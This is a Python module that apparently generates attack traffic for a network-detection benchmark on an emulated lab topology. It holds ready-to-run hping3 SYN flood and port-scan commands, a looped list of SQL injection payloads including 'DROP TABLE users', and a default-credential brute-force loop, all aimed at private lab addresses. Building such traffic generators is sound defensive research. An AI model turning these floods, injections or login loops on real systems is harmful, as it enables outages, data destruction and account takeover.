"""
attack_generator.py — Real attack traffic generation for all 6 benchmark scenarios.

Attacker hosts are strictly separated from Benign User hosts:
  Small Topology: h1 = Attacker Host (10.0.0.1)
  Large Topology: h1, h2 = Attacker Hosts (10.0.0.1, 10.0.0.2)
"""

import shlex
import subprocess
import time


class AttackGenerator:
    def __init__(self):
        self._active = False
        self._processes = []   # list of dicts: {host, pid, proc, cmd, start}
        self._net = None

    def start_attack(self, scenario, net=None):
        self._net = net
        self._active = True
        self._processes = []

        name = scenario.get("name", "unknown")
        attack_cfg = scenario.get("attack", {})
        attack_type = attack_cfg.get("type", name).lower()
        target_ip = "10.0.0.3"
        target_port = 8080

        print(f"[attack] Starting attack: {name} (type={attack_type}, target={target_ip}:{target_port})")

        if net is None:
            print("[attack] WARNING: No network object — cannot launch real attack traffic")
            return

        dispatch = {
            "probe": self._start_probe,
            "dos": self._start_dos,
            "ddos": self._start_ddos,
            "sqli": self._start_sqli,
            "credential": self._start_credential,
            "exfiltration": self._start_exfiltration,
        }

        handler = dispatch.get(attack_type, self._start_probe)
        handler(net, target_ip, target_port, attack_cfg)

        time.sleep(1.0)
        alive = 0
        for rec in self._processes:
            proc = rec.get("proc")
            if proc and proc.poll() is None:
                alive += 1
            else:
                rc = proc.returncode if proc else "N/A"
                print(f"[attack] WARNING: Process on {rec['host']} exited early (rc={rc}): {rec['cmd']}")
        print(f"[attack] {alive}/{len(self._processes)} attack processes alive")

    def stop_attack(self):
        print(f"[attack] Stopping attack — {len(self._processes)} processes to terminate")
        for rec in self._processes:
            proc = rec.get("proc")
            if proc is None:
                continue
            try:
                if proc.poll() is None:
                    proc.terminate()
                    try:
                        proc.wait(timeout=3)
                    except subprocess.TimeoutExpired:
                        proc.kill()
                        proc.wait(timeout=2)
                rc = proc.returncode
                rec["exit_code"] = rc
                rec["stop_time"] = time.time()
            except Exception as e:
                print(f"[attack] Error stopping process on {rec['host']}: {e}")

        self._global_cleanup()
        self._active = False
        self._processes = []
        print("[attack] Attack stopped and cleaned up")

    @property
    def process_log(self):
        result = []
        for rec in self._processes:
            result.append({
                "host": rec.get("host"),
                "cmd": rec.get("cmd"),
                "pid": rec.get("pid"),
                "start_time": rec.get("start"),
                "stop_time": rec.get("stop_time"),
                "exit_code": rec.get("exit_code"),
            })
        return result

    # ------------------------------------------------------------------
    # Attack implementations
    # ------------------------------------------------------------------

    def _start_probe(self, net, target_ip, target_port, cfg):
        hosts = self._get_attackers(net, count=1)
        for h in hosts:
            cmd = f"hping3 -S -p {target_port} --scan 1-1024 -i u500000 {target_ip}"
            self._spawn(h, cmd)

    def _start_dos(self, net, target_ip, target_port, cfg):
        attackers = self._get_attackers(net, count=None)
        servers = [h for h in net.hosts if h.name.startswith("ws") or h.name.startswith("db") or h.name in ("h3", "h5", "h6")]
        target_ips = [s.IP() for s in servers] if servers else [target_ip]

        for i, h in enumerate(attackers):
            t_ip = target_ips[i % len(target_ips)]
            # Flooding SYN packet attack targeting web/db servers
            cmd = f"hping3 --flood -S -p {target_port} -d 120 {t_ip}"
            self._spawn(h, cmd)

    def _start_ddos(self, net, target_ip, target_port, cfg):
        attackers = self._get_attackers(net, count=None)
        servers = [h for h in net.hosts if h.name.startswith("ws") or h.name.startswith("db") or h.name in ("h3", "h5", "h6")]
        target_ips = [s.IP() for s in servers] if servers else [target_ip]

        for i, h in enumerate(attackers):
            t_ip = target_ips[i % len(target_ips)]
            # High intensity volumetric flooding across all target servers
            cmd = f"hping3 --flood -S -p {target_port} -d 120 {t_ip}"
            self._spawn(h, cmd)

    def _start_sqli(self, net, target_ip, target_port, cfg):
        hosts = self._get_attackers(net, count=1)
        payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM information_schema.tables --",
            "1' AND 1=1 --",
            "admin'--",
        ]
        for h in hosts:
            payload_cmds = []
            for p in payloads:
                encoded = p.replace("'", "%27").replace(" ", "%20").replace(";", "%3B")
                payload_cmds.append(
                    f"curl -s -o /dev/null -w '' 'http://{target_ip}:{target_port}/?id={encoded}' 2>/dev/null"
                )
            loop_body = " ; ".join(payload_cmds)
            cmd = f"bash -c 'while true; do {loop_body} ; sleep 0.5; done'"
            self._spawn(h, cmd)

    def _start_credential(self, net, target_ip, target_port, cfg):
        hosts = self._get_attackers(net, count=1)
        users = ["admin", "root", "user"]
        passwords = ["password", "123456", "admin"]
        for h in hosts:
            cred_cmds = []
            for u in users:
                for p in passwords:
                    cred_cmds.append(
                        f"curl -s -o /dev/null -w '' 'http://{target_ip}:{target_port}/login?user={u}&pass={p}' 2>/dev/null"
                    )
            loop_body = " ; ".join(cred_cmds)
            cmd = f"bash -c 'while true; do {loop_body} ; sleep 0.2; done'"
            self._spawn(h, cmd)

    def _start_exfiltration(self, net, target_ip, target_port, cfg):
        hosts = self._get_attackers(net, count=1)
        for h in hosts:
            cmd = f"hping3 -S -p {target_port} -d 1400 -i u100000 {target_ip}"
            self._spawn(h, cmd)

    def _get_attackers(self, net, count=None):
        """Return all designated attacker hosts (att1..att14, h1, h2)."""
        attackers = [h for h in net.hosts if h.name.startswith("att") or h.name in ("h1", "h2")]
        if not attackers:
            attackers = [net.hosts[0]]
        if count is not None:
            return attackers[:count]
        return attackers

    def _spawn(self, host, cmd):
        try:
            proc = host.popen(
                cmd,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.PIPE,
            )
            record = {
                "host": host.name,
                "pid": proc.pid,
                "proc": proc,
                "cmd": cmd,
                "start": time.time(),
                "stop_time": None,
                "exit_code": None,
            }
            self._processes.append(record)
            print(f"[attack]   Spawned on {host.name} (PID {proc.pid}): {cmd[:80]}")
        except Exception as e:
            print(f"[attack] ERROR spawning on {host.name}: {e}")

    def _global_cleanup(self):
        if self._net is None:
            return
        tools = ["hping3", "nmap"]
        for h in self._net.hosts:
            for tool in tools:
                try:
                    h.cmd(f"pkill -9 {tool} 2>/dev/null || true")
                except Exception:
                    pass
            try:
                h.cmd("pkill -9 -f 'while true; do curl' 2>/dev/null || true")
            except Exception:
                pass
